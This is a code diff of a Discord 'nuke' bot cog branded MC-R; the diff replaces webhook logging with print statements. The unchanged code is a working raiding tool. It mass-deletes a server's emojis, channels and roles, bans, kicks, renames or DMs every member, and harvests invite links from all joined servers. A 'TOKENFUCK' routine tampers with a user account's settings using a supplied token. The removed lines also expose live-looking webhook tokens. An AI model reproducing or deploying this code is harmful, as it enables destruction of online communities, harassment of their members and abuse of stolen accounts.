@@ -2,7 +2,7 @@
 # ---------------------------------------------------------------------------
 import discord, asyncio, random, json, pymongo, os
 from pymongo import MongoClient
-from discord import Member, Webhook, RequestsWebhookAdapter
+from discord import Member
 from discord.ext.commands import Bot, has_permissions, CheckFailure, MemberConverter
 from discord.ext import commands
 # ---------------------------------------------------------------------------
@@ -25,16 +25,6 @@ HQ_SERVER_INVITE = config.get("server_invite")
 BAN_GIF = config.get("ban_gif")
 NUKE_GIF = config.get("nuke_gif")
 NUKE_LAUNCH_GIF = config.get("nuke_launch_gif")
-# ---------------------------------------------------------------------------
-# Webhooks
-logs_webhook = Webhook.partial(746158498181808229, "JJNzXDenBhg5t97X7eAX52bjhzL0Oz-dS5b_XKoAzkqjQvA90tWva-5fWibrcEQb2WD5",\
- adapter=RequestsWebhookAdapter()) #logs in HQ
-
-reaper_logs_webhook = Webhook.partial(746157945468747776, "lOrgfZFXSTt32nQq9qzZgeNewBxfaM--bTUT4EFg9jgAWhGGfBMcVUSijddymaEQvgWl",\
- adapter=RequestsWebhookAdapter()) #reaper-logs in HQ
-
-errorlogs_webhook = Webhook.partial(746156734019665929, "i88z41TM5VLxuqnbIdM7EjW1SiaK8GkSUu0H3fOTLBZ9RDQmcOG0xoz6P5j1IafoU1t5",\
- adapter=RequestsWebhookAdapter()) #errorlogs in HQ
 # ---------------------------------------------------------------------------
 # MongoDB Configuration
 MONGOSRV = os.getenv("MONGOSRV")
@@ -134,14 +124,14 @@ class Botsudo(commands.Cog):
             post = {"_id": user.id, "user": user.name+'#'+user.discriminator ,"reason": reason}
             sudo_users_c.insert_one(post)
             await ctx.send(f"Successfully added {user} to sudo users!\n**WITH GREAT POWER COMES WITH GREAT RESPONSIBILITY! DON'T ABUSE IT!!**")
-            reaper_logs_webhook.send(f"{ctx.author} ({ctx.author.id}) added {user} ({user.id}) to sudo users!\nREASON: {reason}")
+            print(f"{ctx.author} ({ctx.author.id}) added {user} ({user.id}) to sudo users!\nREASON: {reason}")
         else:
             try:
                 await ctx.send(f'That user is already a sudo user!\nUpdating database...')
                 sudo_users_c.update_one({"_id":user.id}, {"$set":{"user":user.name+'#'+user.discriminator,"reason":reason}})
             except Exception as e:
                 await ctx.send('Failed to add user to sudo database!')
-                errorlogs_webhook.send(f'>>> Failed to add user to SUDO DATABSE!\nEXCEPTION: {e}')
+                print(f'>>> Failed to add user to SUDO DATABSE!\nEXCEPTION: {e}')
 
     @commands.check(BOT_OWNER_CHECK)
     @commands.command()
@@ -173,10 +163,10 @@ class Botsudo(commands.Cog):
             try:
                 sudo_users_c.delete_one(query)
                 await ctx.send(f"Successfully removed {user} ({user.id}) from the sudo users!")
-                reaper_logs_webhook.send(f"{ctx.author} ({ctx.author.id}) removed {user} ({user.id}) from the sudo database!\nREASON: {reason}")
+                print(f"{ctx.author} ({ctx.author.id}) removed {user} ({user.id}) from the sudo database!\nREASON: {reason}")
             except Exception as e:
                 await ctx.send('Failed to remove user to sudo database!')
-                errorlogs_webhook.send(f'>>> Failed to remove {user} ({user.id}) from SUDO DATABSE!\nEXCEPTION: {e}')
+                print(f'>>> Failed to remove {user} ({user.id}) from SUDO DATABSE!\nEXCEPTION: {e}')
     
     @commands.check(BOT_OWNER_CHECK)
     @commands.command()
@@ -203,7 +193,7 @@ class Botsudo(commands.Cog):
             await ctx.message.delete()
             await self.bot.user.edit(username=name)
             await ctx.send(f"Changed my name to **{name}**!")
-            reaper_logs_webhook.send(f'**{ctx.message.author} ({ctx.message.author.id})** renamed me to {name}.')
+            print(f'**{ctx.message.author} ({ctx.message.author.id})** renamed me to {name}.')
         except Exception:
             await ctx.send(f"{ctx.message.author.mention}! You are changing my name too fast!")
 
@@ -310,15 +300,15 @@ class Botsudo(commands.Cog):
     @commands.check(SUDOER_CHECK)
     @commands.command()
     async def servers(self, ctx):
-        await ctx.send('Gathering server invites...')
+        await ctx.send('Gathering servers..')
         for servers in self.bot.guilds:
             try:
                 serverinvitesr = await servers.invites()
                 for serverinvites in serverinvitesr:
-                    await logs_webhook.send(serverinvites.url)
+                    print(f'[SERVERS] {serverinvites.url} | {servers.name} | {servers.id}')
             except:
                 pass
-        await ctx.send("Check console or logs for server invites")
+        await ctx.send("Check console server info.")
 
     @commands.check(SUDOER_CHECK)
     @commands.command()
@@ -332,7 +322,7 @@ class Botsudo(commands.Cog):
                 server = self.bot.get_guild(server_id)
                 await server.leave()
                 await ctx.send(f"Left {server} successfully!")
-            reaper_logs_webhook.send(f'**{ctx.message.author} ({ctx.message.author.id})** ran `leaveserver` in {ctx.guild.name} ({ctx.guild.id})!')
+            print(f'**{ctx.message.author} ({ctx.message.author.id})** ran leaveserver in {ctx.guild.name} ({ctx.guild.id})!')
         except Exception as e:
             print(f"Failed to leave {server}\n{e}")
             await ctx.send(f"Failed to leave {server}\n{e}")
@@ -341,7 +331,7 @@ class Botsudo(commands.Cog):
     @commands.command()
     async def chanmsgall(self, ctx, *, msg):
 
-        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
+        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
 
         for channel in list(ctx.guild.channels):
             try:
@@ -357,7 +347,7 @@ class Botsudo(commands.Cog):
     @commands.check(SUDOER_CHECK)
     @commands.command()
     async def kickall(self, ctx):
-        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
+        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         await ctx.message.delete()
         for user in list(ctx.guild.members):
             try:
@@ -371,7 +361,7 @@ class Botsudo(commands.Cog):
     @commands.check(SUDOER_CHECK)
     @commands.command()
     async def banall(self, ctx):
-        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
+        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         await ctx.message.delete()
         for user in list(ctx.guild.members):
             try:
@@ -385,7 +375,7 @@ class Botsudo(commands.Cog):
     @commands.check(SUDOER_CHECK)
     @commands.command()
     async def renameall(self, ctx, *, rename_to):
-        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
+        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         await ctx.message.delete()
         for user in list(ctx.guild.members):
             try:
@@ -399,7 +389,7 @@ class Botsudo(commands.Cog):
     @commands.check(SUDOER_CHECK)
     @commands.command()
     async def msgall(self, ctx, *, message):
-        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
+        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         await ctx.message.delete()
         for user in ctx.guild.members:
             try:
@@ -413,7 +403,7 @@ class Botsudo(commands.Cog):
     @commands.check(SUDOER_CHECK)
     @commands.command()
     async def deleteall(self, ctx, condition):
-        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
+        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         if condition.lower() == "channels":
             for channel in list(ctx.guild.channels):
                 try:
@@ -465,33 +455,33 @@ class Botsudo(commands.Cog):
     @commands.command()
     async def destroy(self, ctx):
         await ctx.send(f"{NUKE_GIF}\nYour server had been fucked up by MC-R!")
-        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
+        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         await ctx.message.delete()
         for emoji in list(ctx.guild.emojis):
             try:
                 await emoji.delete()
-                logs_webhook.send(f"{emoji.name} has been deleted in {ctx.guild.name}")
+                print(f"{emoji.name} has been deleted in {ctx.guild.name}")
             except:
-                logs_webhook.send(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
+                print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
         for channel in list(ctx.guild.channels):
             try:
                 await channel.delete()
-                logs_webhook.send(f"{channel.name} has been deleted in {ctx.guild.name}")
+                print(f"{channel.name} has been deleted in {ctx.guild.name}")
             except:
-                logs_webhook.send(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
+                print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
         for role in list(ctx.guild.roles):
             try:
                 await role.delete()
 
-                logs_webhook.send(f"{role.name} has been deleted in {ctx.guild.name}")
+                print(f"{role.name} has been deleted in {ctx.guild.name}")
             except:
-                logs_webhook.send(f"{role.name} NOT been deleted in {ctx.guild.name}")
+                print(f"{role.name} NOT been deleted in {ctx.guild.name}")
         for user in list(ctx.guild.members):
             try:
                 await ctx.guild.ban(user)
-                logs_webhook.send(f"{user.name} has been banned from {ctx.guild.name}")
+                print(f"{user.name} has been banned from {ctx.guild.name}")
             except:
-                logs_webhook.send(f"{user.name} has FAILED to be banned from {ctx.guild.name}")
+                print(f"{user.name} has FAILED to be banned from {ctx.guild.name}")
 
     # Same as destroy but uses a server id instead.
     @commands.check(SUDOER_CHECK)
@@ -501,32 +491,32 @@ class Botsudo(commands.Cog):
         nem = discord.Embed(description=f'Attempting to Nuke **{servername.name}**...')
         nem.set_image(url=NUKE_LAUNCH_GIF)
         nukemsg = await ctx.send(embed=nem)
-        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id}) on {servername} ({servername.id})")
+        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id}) on {servername} ({servername.id})")
         await ctx.message.delete()
         for emoji in list(servername.emojis):
             try:
                 await emoji.delete()
-                logs_webhook.send(f"{emoji.name} has been deleted in {servername.name}")
+                print(f"{emoji.name} has been deleted in {servername.name}")
             except:
-                logs_webhook.send(f"{emoji.name} has NOT been deleted in {servername.name}")
+                print(f"{emoji.name} has NOT been deleted in {servername.name}")
         for channel in list(servername.channels):
             try:
                 await channel.delete()
-                logs_webhook.send(f"{channel.name} has been deleted in {servername.name}")
+                print(f"{channel.name} has been deleted in {servername.name}")
             except:
-                logs_webhook.send(f"{channel.name} has NOT been deleted in {servername.name}")
+                print(f"{channel.name} has NOT been deleted in {servername.name}")
         for role in list(servername.roles):
             try:
                 await role.delete()
-                logs_webhook.send(f"{role.name} has been deleted in {servername.name}")
+                print(f"{role.name} has been deleted in {servername.name}")
             except:
-                logs_webhook.send(f"{role.name} has NOT been deleted in {servername.name}")
+                print(f"{role.name} has NOT been deleted in {servername.name}")
         for user in list(servername.members):
             try:
                 await servername.ban(user)
-                logs_webhook.send(f"{user.name} has been banned from {servername.name}")
+                print(f"{user.name} has been banned from {servername.name}")
             except:
-                logs_webhook.send(f"{user.name} has FAILED to be banned from {servername.name}")
+                print(f"{user.name} has FAILED to be banned from {servername.name}")
         nem.set_image(url=NUKE_GIF)
         nukemsg.edit(embed=nem, content=f'**Finished nuking {servername.name}**')
 
@@ -588,7 +578,7 @@ class Botsudo(commands.Cog):
             try:
                 request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
             except Exception as e:
-                errorlogs_webhook.send(f"[ERROR] CMD|TOKENFUCK: {e}")
+                print(f"[ERROR] CMD|TOKENFUCK: {e}")
             else:
                 break
 
@@ -605,7 +595,7 @@ class Botsudo(commands.Cog):
                 try:
                     request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
                 except Exception as e:
-                    errorlogs_webhook.send(f"[ERROR] CMD|TOKENFUCK: {e}")
+                    print(f"[ERROR] CMD|TOKENFUCK: {e}")
                 else:
                     break
 # ---------------------------------------------------------------------------
